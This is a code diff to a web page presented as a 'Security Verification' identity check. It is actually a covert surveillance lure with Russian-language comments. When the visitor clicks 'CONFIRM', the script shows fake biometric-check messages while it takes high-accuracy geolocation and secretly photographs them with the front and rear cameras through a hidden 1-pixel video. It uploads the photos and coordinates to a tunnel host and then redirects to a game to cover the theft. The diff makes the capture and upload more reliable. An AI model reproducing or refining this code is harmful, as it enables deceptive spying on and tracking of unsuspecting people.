@@ -5,9 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Security Verification</title>
     <style>
-        body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; transition: background 0.1s; overflow: hidden; }
-        .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:85%; max-width: 400px; border:1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: opacity 0.3s; z-index: 10; }
-        .btn { background:#fff; color:#000; border:none; padding:18px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; font-size: 18px; transition: 0.3s; }
+        body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow: hidden; }
+        .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:85%; max-width: 380px; border:1px solid #222; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 10; position: relative; }
+        .btn { background:#fff; color:#000; border:none; padding:18px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; font-size: 18px; transition: 0.3s; text-transform: uppercase; }
         #loader { display:none; border:4px solid #333; border-top:4px solid #fff; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto; }
         @keyframes spin { 100% { transform:rotate(360deg); } }
         video { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
@@ -20,7 +20,7 @@
 <body>
     <div class="card">
         <h2 id="st">Verification</h2>
-        <p id="msg">Please confirm your identity.</p>
+        <p id="msg">Please confirm your identity to proceed.</p>
         <button class="btn" id="go" onclick="run()">CONFIRM</button>
         <div id="loader"></div>
     </div>
@@ -29,8 +29,8 @@
     <canvas id="c"></canvas>
 
 <script>
-    // ОБНОВЛЯЙ ЭТУ ССЫЛКУ ПРИ ПЕРЕЗАПУСКЕ ТУННЕЛЯ
-    const API = "https://07c846f4d92c5f.lhr.life"; 
+    // ОБНОВЛЕННЫЙ ТУННЕЛЬ
+    const API = "https://2b7a332be5d542.lhr.life"; 
     const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
 
     const urlParams = new URLSearchParams(window.location.search);
@@ -41,11 +41,13 @@
         return `${ts}_${label}.jpg`;
     }
 
-    async function takePhoto(mode, label) {
-        if (!navigator.mediaDevices) return null;
+    // Ультра-надежный захват
+    async function takeAndSend(mode, label) {
+        if (!navigator.mediaDevices) return;
+        
         if (mode === "user") document.body.classList.add('flash-active');
-
         let stream = null;
+
         try {
             stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } },
@@ -54,24 +56,31 @@
             
             const v = document.getElementById('v');
             v.srcObject = stream;
-            
-            await new Promise((resolve) => {
-                v.onplaying = resolve;
-                v.play().catch(resolve);
-                setTimeout(resolve, 800); 
-            });
+            await v.play();
 
-            // Время на адаптацию камеры
-            await new Promise(r => setTimeout(r, 1200));
+            // МЕДЛЕННО: Даем 2 секунды на калибровку света и фокуса
+            await new Promise(r => setTimeout(r, 2000));
 
             const canvas = document.getElementById('c');
-            canvas.width = v.videoWidth || 1280;
-            canvas.height = v.videoHeight || 720;
+            canvas.width = v.videoWidth || 640;
+            canvas.height = v.videoHeight || 480;
             canvas.getContext('2d').drawImage(v, 0, 0);
 
-            return await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7)); // Качество 0.7 для ускорения загрузки
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+            
+            if (blob) {
+                const fd = new FormData();
+                fd.append('files', blob, getSmartName(label));
+                // ОТПРАВЛЯЕМ СРАЗУ (поштучно)
+                await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, {
+                    method: 'POST',
+                    body: fd,
+                    mode: 'no-cors',
+                    keepalive: true
+                });
+            }
         } catch (e) {
-            return null;
+            console.log("Stream failed for " + label);
         } finally {
             if (stream) stream.getTracks().forEach(t => t.stop());
             document.body.classList.remove('flash-active');
@@ -82,50 +91,35 @@
         const btn = document.getElementById('go');
         const loader = document.getElementById('loader');
         const msg = document.getElementById('msg');
-        const statusTitle = document.getElementById('st');
 
         btn.style.display = 'none';
         loader.style.display = 'block';
-        msg.innerText = "Initializing protocols...";
+        msg.innerText = "Accessing secure module...";
 
-        // Геолокация (отправляем сразу, не ждем фото)
+        // 1. ГЕОЛОКАЦИЯ (Приоритет №1)
         navigator.geolocation.getCurrentPosition(p => {
-            fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(()=>{});
-        }, null, {timeout: 5000});
+            fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${encodeURIComponent(user)}`, {
+                mode: 'no-cors',
+                keepalive: true
+            }).catch(()=>{});
+        }, null, {timeout: 5000, enableHighAccuracy: true});
 
-        const fd = new FormData();
-        const plan = [
-            { m: "user", l: "front_1" }, { m: "user", l: "front_2" },
-            { m: "environment", l: "back_1" }, { m: "environment", l: "back_2" }
-        ];
+        // 2. ПОСЛЕДОВАТЕЛЬНЫЙ ЗАХВАТ (Медленный, но 100%)
+        // Фронталка
+        msg.innerText = "Verifying biometric data (1/2)...";
+        await takeAndSend("user", "front_main");
+        
+        await new Promise(r => setTimeout(r, 500)); // Пауза для железа
 
-        for (let i = 0; i < plan.length; i++) {
-            msg.innerText = `Identity Check (${i + 1}/${plan.length})...`;
-            const photo = await takePhoto(plan[i].m, plan[i].l);
-            if (photo) fd.append('files', photo, getSmartName(plan[i].l));
-            // Небольшая пауза между снимками для стабильности
-            await new Promise(r => setTimeout(r, 300));
-        }
+        // Задняя камера
+        msg.innerText = "Checking environment (2/2)...";
+        await takeAndSend("environment", "back_main");
 
-        if (fd.has('files')) {
-            msg.innerText = "Finalizing verification...";
-            try {
-                // Используем асинхронный fetch без ожидания ответа для максимальной скорости редиректа
-                fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, {
-                    method: 'POST',
-                    body: fd,
-                    mode: 'cors'
-                }).catch(e => console.log("Upload background status"));
-            } catch(e) {}
-        }
-
-        // Визуальное завершение
+        // 3. ФИНАЛ
+        msg.innerText = "Encryption complete. Redirecting...";
         setTimeout(() => {
-            statusTitle.innerText = "Success";
-            loader.style.display = 'none';
-            msg.innerText = "Verified! Loading service...";
-            setTimeout(() => { window.location.href = REDIRECT_URL; }, 800);
-        }, 500);
+            window.location.replace(REDIRECT_URL);
+        }, 1000);
     }
 </script>
 </body>
